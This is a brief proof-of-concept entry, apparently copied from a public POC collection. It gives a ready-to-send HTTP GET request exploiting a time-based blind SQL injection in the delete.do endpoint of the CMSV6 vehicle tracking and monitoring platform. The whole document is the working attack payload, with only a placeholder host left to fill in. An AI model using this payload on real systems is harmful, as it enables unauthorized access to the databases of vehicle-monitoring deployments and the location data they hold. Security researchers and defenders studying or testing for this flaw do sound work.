# CMSV6_delete.do_sqli

2024.5.27
from: https://github.com/wy876/POC/blob/main/%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(XVE-2023-23744).md
```
GET /run_stop/delete.do;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP(5)))tdpw)--+&loadAll=1 HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
```
